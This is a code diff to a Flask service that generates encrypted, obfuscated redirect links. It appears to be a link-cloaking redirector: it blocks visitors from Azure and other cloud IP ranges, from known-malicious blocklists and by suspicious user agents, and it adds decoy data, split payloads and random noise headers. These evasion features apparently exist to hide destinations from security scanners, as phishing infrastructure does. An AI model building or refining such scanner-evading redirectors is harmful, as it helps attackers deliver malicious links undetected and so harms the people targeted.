@@ -1,4 +1,4 @@
-from flask import Flask, request, redirect, render_template_string, abort, url_for, session, jsonify
+from flask import Flask, request, redirect, render_template_string, abort, url_for, session, jsonify, make_response
 from flask_wtf import FlaskForm, CSRFProtect
 from wtforms import StringField, SubmitField, SelectField, BooleanField, HiddenField
 from wtforms.validators import DataRequired, Length, Regexp, URL
@@ -25,6 +25,8 @@ import bleach
 from dotenv import load_dotenv
 import ipaddress
 import string
+import sys
+from bs4 import BeautifulSoup
 
 app = Flask(__name__)
 load_dotenv()
@@ -62,7 +64,7 @@ REQUIRED_HEADERS = ['Accept', 'Accept-Language', 'Connection']
 BLOCKED_CIDR_CACHE_KEY = "blocked_cidr"
 BLOCKED_CIDR_REFRESH_INTERVAL = 3600
 RISK_SCORE_THRESHOLD = 75
-MAX_PAYLOAD_PADDING = 128
+MAX_PAYLOAD_PADDING = 64
 
 # Verify keys at startup
 try:
@@ -100,6 +102,13 @@ except Exception as e:
 
 # CSRF protection
 csrf = CSRFProtect(app)
+
+# Register after_request globally
+@app.after_request
+def add_noise_headers(response):
+    response.headers['X-Random-Token'] = secrets.token_hex(8)
+    response.headers['X-Session-ID'] = generate_random_string(16)
+    return response
 
 # WTForms for login and URL generation
 class LoginForm(FlaskForm):
@@ -180,13 +189,18 @@ def fetch_blocked_cidrs():
             if cidr:
                 blocked_cidrs.append(ipaddress.ip_network(cidr, strict=False))
 
-        # Fetch Azure CIDRs (simplified, assumes JSON download)
+        # Fetch Azure CIDRs (scrape JSON URL from confirmation page)
         azure_response = requests.get(AZURE_CIDR_URL, timeout=10)
         azure_response.raise_for_status()
-        azure_data = azure_response.json()
-        for value in azure_data.get('values', []):
-            for cidr in value.get('properties', {}).get('addressPrefixes', []):
-                blocked_cidrs.append(ipaddress.ip_network(cidr, strict=False))
+        soup = BeautifulSoup(azure_response.text, 'html.parser')
+        json_url = soup.find('a', href=re.compile(r'.*\.json$'))
+        if json_url:
+            json_response = requests.get(json_url['href'], timeout=10)
+            json_response.raise_for_status()
+            azure_data = json_response.json()
+            for value in azure_data.get('values', []):
+                for cidr in value.get('properties', {}).get('addressPrefixes', []):
+                    blocked_cidrs.append(ipaddress.ip_network(cidr, strict=False))
 
         # Fetch malicious CIDRs
         blocklist_response = requests.get(BLOCKLIST_URL, timeout=10)
@@ -237,10 +251,14 @@ def is_suspicious_request():
 
     # Check blocked CIDRs
     blocked_cidrs = fetch_blocked_cidrs()
-    ip_addr = ipaddress.ip_address(ip)
-    if any(ip_addr in cidr for cidr in blocked_cidrs):
-        risk_score += 50
-        logger.debug(f"IP {ip} in blocked CIDR")
+    try:
+        ip_addr = ipaddress.ip_address(ip)
+        if any(ip_addr in cidr for cidr in blocked_cidrs):
+            risk_score += 50
+            logger.debug(f"IP {ip} in blocked CIDR")
+    except ValueError:
+        logger.warning(f"Invalid IP address: {ip}")
+        risk_score += 20
 
     # User-Agent analysis
     if any(re.search(pattern, ua, re.IGNORECASE) for pattern in SUSPICIOUS_UA_PATTERNS):
@@ -307,26 +325,24 @@ def dynamic_rate_limit(base_limit=5, base_per=60):
     return decorator
 
 # Payload encryption and obfuscation
-def xor_obfuscate(data, key):
-    key_bytes = key.encode() if isinstance(key, str) else key
-    return bytes(a ^ b for a, b in zip(data, key_bytes * (len(data) // len(key_bytes) + 1)))
-
 def encrypt_payload(payload):
     try:
         # Add random padding
         padding = secrets.token_bytes(random.randint(16, MAX_PAYLOAD_PADDING))
-        padded_payload = json.dumps({"data": payload, "decoy": secrets.token_hex(32)}).encode()
-        padded_payload += padding
+        padded_payload = json.dumps({
+            "data": payload,
+            "decoy": secrets.token_hex(32),
+            "timestamp": int(time.time())
+        }).encode() + padding
 
-        # XOR obfuscation
-        xor_key = secrets.token_bytes(16)
-        xored = xor_obfuscate(padded_payload, xor_key)
+        # Base64 encode for UTF-8 safety
+        b64_payload = base64.urlsafe_b64encode(padded_payload)
 
         # AES-GCM encryption
         iv = secrets.token_bytes(12)
         cipher = Cipher(algorithms.AES(AES_GCM_KEY), modes.GCM(iv), backend=default_backend())
         encryptor = cipher.encryptor()
-        ciphertext = encryptor.update(xored) + encryptor.finalize()
+        ciphertext = encryptor.update(b64_payload) + encryptor.finalize()
         encrypted = iv + ciphertext + encryptor.tag
 
         # HMAC signature
@@ -334,29 +350,49 @@ def encrypt_payload(payload):
         h.update(encrypted)
         signature = h.finalize()
 
-        # Split payload
-        split_index = random.randint(len(encrypted) // 3, len(encrypted) * 2 // 3)
-        part1 = base64.urlsafe_b64encode(encrypted[:split_index]).decode()
-        part2 = base64.urlsafe_b64encode(encrypted[split_index:]).decode()
+        # Split payload into parts
+        parts = []
+        chunk_size = len(encrypted) // 2 + random.randint(-20, 20)
+        for i in range(0, len(encrypted), chunk_size):
+            parts.append(base64.urlsafe_b64encode(encrypted[i:i+chunk_size]).decode())
         sig = base64.urlsafe_b64encode(signature).decode()
         slug = f"{uuid.uuid4()}{secrets.token_hex(10)}"
-        result = f"{part1}.{part2}.{sig}.{slug}"
+        
+        # Store parts in Valkey
         if valkey_client:
-            valkey_client.setex(f"xor_key:{slug}", 3600, base64.urlsafe_b64encode(xor_key).decode())
+            for i, part in enumerate(parts):
+                valkey_client.setex(f"payload_part:{slug}:{i}", 3600, part)
+            valkey_client.setex(f"payload_parts_count:{slug}", 3600, len(parts))
+
+        result = f"{base64.urlsafe_b64encode(slug.encode()).decode()}.{sig}"
         logger.debug(f"Encrypted payload: {result[:20]}...")
         return result
     except Exception as e:
-        logger.error(f"Payload encryption error: {str(e)}")
+        logger.error(f"Payload encryption error: {str(e)}", exc_info=True)
         raise ValueError(f"Encryption failed: {str(e)}")
 
 def decrypt_payload(encrypted):
     try:
         parts = encrypted.split('.')
-        if len(parts) != 4:
+        if len(parts) != 2:
             raise ValueError("Invalid payload format")
-        part1, part2, sig_b64, slug = parts
-        encrypted_data = (base64.urlsafe_b64decode(part1) + base64.urlsafe_b64decode(part2))
+        slug_b64, sig_b64 = parts
+        slug = base64.urlsafe_b64decode(slug_b64).decode()
         signature = base64.urlsafe_b64decode(sig_b64)
+
+        # Reassemble payload from parts
+        if not valkey_client:
+            raise ValueError("Valkey unavailable for payload parts")
+        parts_count = int(valkey_client.get(f"payload_parts_count:{slug}") or 0)
+        if parts_count == 0:
+            raise ValueError("Payload parts not found")
+
+        encrypted_data = b""
+        for i in range(parts_count):
+            part = valkey_client.get(f"payload_part:{slug}:{i}")
+            if not part:
+                raise ValueError(f"Payload part {i} not found")
+            encrypted_data += base64.urlsafe_b64decode(part)
 
         # Verify HMAC
         h = hmac.HMAC(HMAC_KEY, hashes.SHA256(), backend=default_backend())
@@ -369,25 +405,16 @@ def decrypt_payload(encrypted):
         ciphertext = encrypted_data[12:-16]
         cipher = Cipher(algorithms.AES(AES_GCM_KEY), modes.GCM(iv, tag), backend=default_backend())
         decryptor = cipher.decryptor()
-        xored = decryptor.update(ciphertext) + decryptor.finalize()
+        b64_payload = decryptor.update(ciphertext) + decryptor.finalize()
 
-        # XOR deobfuscation
-        if valkey_client:
-            xor_key_b64 = valkey_client.get(f"xor_key:{slug}")
-            if not xor_key_b64:
-                raise ValueError("XOR key not found")
-            xor_key = base64.urlsafe_b64decode(xor_key_b64)
-        else:
-            raise ValueError("Valkey unavailable for XOR key")
-        padded_payload = xor_obfuscate(xored, xor_key)
-
-        # Remove padding
+        # Decode base64
+        padded_payload = base64.urlsafe_b64decode(b64_payload)
         payload_json = json.loads(padded_payload.decode().split('}')[0] + '}')
         result = payload_json['data']
         logger.debug(f"Decrypted payload: {result[:50]}...")
         return result
     except Exception as e:
-        logger.error(f"Payload decryption error: {str(e)}")
+        logger.error(f"Payload decryption error: {str(e)}", exc_info=True)
         raise ValueError(f"Decryption failed: {str(e)}")
 
 # URL generation utilities
@@ -439,13 +466,6 @@ def block_suspicious_requests():
         if is_suspicious_request():
             logger.warning(f"Blocked suspicious request from {request.remote_addr}: {request.url}")
             abort(403, "Access Denied")
-        # Add noise headers
-        response_headers = {
-            'X-Random-Token': secrets.token_hex(8),
-            'X-Session-ID': generate_random_string(16)
-        }
-        for k, v in response_headers.items():
-            app.after_request(lambda response: response.set_header(k, v) or response)
     except Exception as e:
         logger.error(f"Error in block_suspicious_requests: {str(e)}")
 
@@ -509,7 +529,7 @@ def login():
             </html>
         """, form=form)
     except Exception as e:
-        logger.error(f"Error in login: {str(e)}")
+        logger.error(f"Error in login: {str(e)}", exc_info=True)
         return render_template_string("""
             <!DOCTYPE html>
             <html lang="en">
@@ -537,7 +557,7 @@ def index():
             return redirect(url_for('dashboard'))
         return redirect(url_for('login'))
     except Exception as e:
-        logger.error(f"Error in index: {str(e)}")
+        logger.error(f"Error in index: {str(e)}", exc_info=True)
         return render_template_string("""
             <!DOCTYPE html>
             <html lang="en">
@@ -768,7 +788,7 @@ def dashboard():
             </html>
         """, username=username, form=form, urls=urls, primary_color=primary_color, error=error, valkey_error=valkey_error)
     except Exception as e:
-        logger.error(f"Dashboard error for user {username}: {str(e)}")
+        logger.error(f"Dashboard error for user {username}: {str(e)}", exc_info=True)
         return render_template_string("""
             <!DOCTYPE html>
             <html lang="en">
@@ -813,7 +833,7 @@ def toggle_analytics(url_id):
             return jsonify({"status": "ok"}), 200
         return jsonify({"status": "error", "message": "Database unavailable"}), 500
     except Exception as e:
-        logger.error(f"Error in toggle_analytics: {str(e)}")
+        logger.error(f"Error in toggle_analytics: {str(e)}", exc_info=True)
         return jsonify({"status": "error", "message": "Internal server error"}), 500
 
 @app.route("/delete_url/<url_id>", methods=["GET"])
@@ -848,7 +868,7 @@ def delete_url(url_id):
             </html>
         """), 500
     except Exception as e:
-        logger.error(f"Error in delete_url: {str(e)}")
+        logger.error(f"Error in delete_url: {str(e)}", exc_info=True)
         return render_template_string("""
             <!DOCTYPE html>
             <html lang="en">
@@ -901,7 +921,7 @@ def redirect_handler(username, endpoint, encrypted_payload, path_segment):
                     ttl = max(1, int(expiry - time.time()))
                     valkey_client.setex(f"url_payload:{url_id}", ttl, payload)
             except ValueError as e:
-                logger.error(f"Decryption failed: {str(e)}")
+                logger.error(f"Decryption failed: {str(e)}", exc_info=True)
                 return render_template_string("""
                     <!DOCTYPE html>
                     <html lang="en">
@@ -914,7 +934,7 @@ def redirect_handler(username, endpoint, encrypted_payload, path_segment):
                     <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
                         <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
                             <h3 class="text-lg font-bold mb-4 text-red-600">Invalid Link</h3>
-                            <p class="text-gray-600">The link is invalid or has expired.</p>
+                            <p class="text-gray-600">The link is invalid or has expired. Please try generating a new link or contact support.</p>
                         </div>
                     </body>
                     </html>
@@ -933,14 +953,14 @@ def redirect_handler(username, endpoint, encrypted_payload, path_segment):
                     valkey_client.delete(f"url_payload:{url_id}")
                 abort(410, "URL has expired")
         except Exception as e:
-            logger.error(f"Payload parsing error: {str(e)}")
+            logger.error(f"Payload parsing error: {str(e)}", exc_info=True)
             abort(400, "Invalid payload")
 
         final_url = f"{redirect_url.rstrip('/')}/{cleaned_path_segment.lstrip('/')}"
         logger.info(f"Redirecting to {final_url}")
         return redirect(final_url, code=302)
     except Exception as e:
-        logger.error(f"Error in redirect_handler: {str(e)}")
+        logger.error(f"Error in redirect_handler: {str(e)}", exc_info=True)
         return render_template_string("""
             <!DOCTYPE html>
             <html lang="en">
@@ -954,6 +974,7 @@ def redirect_handler(username, endpoint, encrypted_payload, path_segment):
                 <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
                     <h3 class="text-lg font-bold mb-4 text-red-600">Internal Server Error</h3>
                     <p class="text-gray-600">Something went wrong: {{ error }}</p>
+                    <p class="text-gray-600">Please try again later or contact support.</p>
                 </div>
             </body>
             </html>
@@ -968,7 +989,7 @@ def redirect_handler_no_subdomain(endpoint, encrypted_payload, path_segment):
         logger.debug(f"Fallback redirect handler: username={username}, endpoint={endpoint}")
         return redirect_handler(username, endpoint, encrypted_payload, path_segment)
     except Exception as e:
-        logger.error(f"Error in redirect_handler_no_subdomain: {str(e)}")
+        logger.error(f"Error in redirect_handler_no_subdomain: {str(e)}", exc_info=True)
         return render_template_string("""
             <!DOCTYPE html>
             <html lang="en">
@@ -982,6 +1003,7 @@ def redirect_handler_no_subdomain(endpoint, encrypted_payload, path_segment):
                 <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
                     <h3 class="text-lg font-bold mb-4 text-red-600">Internal Server Error</h3>
                     <p class="text-gray-600">Something went wrong: {{ error }}</p>
+                    <p class="text-gray-600">Please try again later or contact support.</p>
                 </div>
             </body>
             </html>
@@ -1003,6 +1025,7 @@ def catch_all(path):
             <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
                 <h3 class="text-lg font-bold mb-4 text-red-600">Not Found</h3>
                 <p class="text-gray-600">The requested URL was not found on the server.</p>
+                <p class="text-gray-600">Please check your spelling and try again.</p>
             </div>
         </body>
         </html>
@@ -1012,5 +1035,5 @@ if __name__ == "__main__":
     try:
         app.run(host="0.0.0.0", port=5000, debug=False)
     except Exception as e:
-        logger.error(f"Error starting Flask app: {str(e)}")
+        logger.error(f"Error starting Flask app: {str(e)}", exc_info=True)
         sys.exit(1)
